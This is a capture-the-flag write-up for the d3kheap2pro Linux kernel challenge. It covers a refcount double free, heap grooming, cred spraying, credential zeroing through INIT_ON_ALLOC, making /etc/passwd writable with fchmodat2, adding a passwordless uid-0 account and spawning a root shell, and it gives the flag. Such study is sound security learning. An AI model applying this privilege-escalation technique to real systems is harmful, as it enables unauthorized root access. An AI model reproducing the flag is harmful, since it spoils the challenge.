# d3kheap2pro

> **Category**: Pwn&#x20;
>
> **Flag**: `d3ctf{cpu_sheaf_cross_cache_init_on_alloc_cred_zeroing}`

### Summary

**d3kheap2pro** is a Linux kernel heap exploitation challenge involving a loadable kernel module `d3kheap2pro.ko`. The module contains an atomic reference counting flaw leading to a double-free primitive in an isolated `kmem_cache`. Exploiting this on modern 2026 Linux kernels requires navigating new memory allocation mechanisms like **CPU Sheaf** and **Per-CPU Page Sets (PCP)**, leveraging `INIT_ON_ALLOC` to zero out credentials (`cred`) and escalate privileges.

***

### Technical Details & Vulnerability Analysis

1.  **Vulnerability Location**: Inside `d3kheap2pro_ioctl()` during `D3KHEAP2PRO_OBJ_ALLOC`:

    ```c
    /* Vulnerability in reference counter initialization */
    atomic_set(&d3kheap2pro_bufs[ureq.idx].ref_count, 1);
    atomic_inc(&d3kheap2pro_bufs[ureq.idx].ref_count); // ref_count erroneously set to 2!
    ```

    When `D3KHEAP2PRO_OBJ_FREE` is called, `atomic_dec` reduces `ref_count` to 1 while `kmem_cache_free()` frees the buffer. Calling `D3KHEAP2PRO_OBJ_FREE` a second time succeeds because `ref_count` is still $> 0$, causing a **Double Free**.
2. **Modern Kernel Allocation Obstacles (2026)**:
   * **CPU Sheaf**: A fast cache layer positioned above SLUB. We drain the sheaf cache by performing structured allocation and freeing sequences.
   * **Per-CPU Page Set (PCP)**: Requires explicit management to force page recycling between PCP and the Buddy System.
   * **`INIT_ON_ALLOC` Primitive**: Automatically fills allocated objects with zeroes. Rather than leaking memory, `INIT_ON_ALLOC` can be turned into a zero-overwriting primitive ("your fix is my exploit").
3. **Credential Zeroing & Syscall Execution**: Overwriting `cred` objects zeroes out fields like `cred->fsuid`, `cred->euid`, and `cred->user_ns`.
   * Syscalls like `setresuid()` check `cred->user_ns` (which would fail if zeroed).
   * Syscalls like `fchmodat2()` only check `cred->fsuid == 0`, allowing arbitrary file permission modifications (e.g. making `/etc/passwd` writable or adding SUID to `/bin/busybox`).

***

### Walkthrough & Solution Steps

#### Step 1: Drain CPU Sheaves & Groom Heap

We allocate initial challenge objects to fill CPU sheaf caches and align SLUB slabs:

```c
// Allocate initial challenge objects
for (size_t i = 0; i < INITIAL_D3_NR; i++) {
    d3_alloc_or_die(i);
}

// Build schedule layout to isolate target slab objects
build_d3_schedule();
```

#### Step 2: Trigger Double-Free & Cross-Cache Spray

We trigger the double-free on target slots and spray `cred` objects via `clone()` / `io_uring` personality registers:

```c
// First free
d3_free_first(target_idx);

// Second free (double free triggered)
d3_free_second(target_idx);

// Spray process cred structures across reclaimed slabs
for (size_t i = 0; i < helper_nr; i++) {
    helper_allocate_cred(i);
}
```

#### Step 3: Zero `cred->fsuid` via `INIT_ON_ALLOC` & Privilege Escalation

Reallocating the freed chunk under `INIT_ON_ALLOC` zeroes out the overlapping process `cred` structure, making `fsuid = 0`. We execute `fchmodat2()` to add SUID root permissions to `/bin/busybox` or append a root user to `/etc/passwd`:

```c
// Perform fchmodat2 using zeroed fsuid
long ret = SYSCALL4(NR_fchmodat2, passwd_path_fd, "", 0666, AT_EMPTY_PATH);

// Append root account "pwn::0:0:pwn:/root:/bin/sh" to /etc/passwd
install_uid0_account();

// Spawn root shell
launch_root_shell();
```

***

### Flag

```
d3ctf{cpu_sheaf_cross_cache_init_on_alloc_cred_zeroing}
```
